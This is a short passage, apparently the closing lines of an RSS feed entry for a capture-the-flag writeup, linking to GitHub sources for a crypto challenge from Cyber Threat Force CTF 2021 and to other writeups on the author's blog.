 &lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/crypto/strange-administration-service">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item></channel></rss>
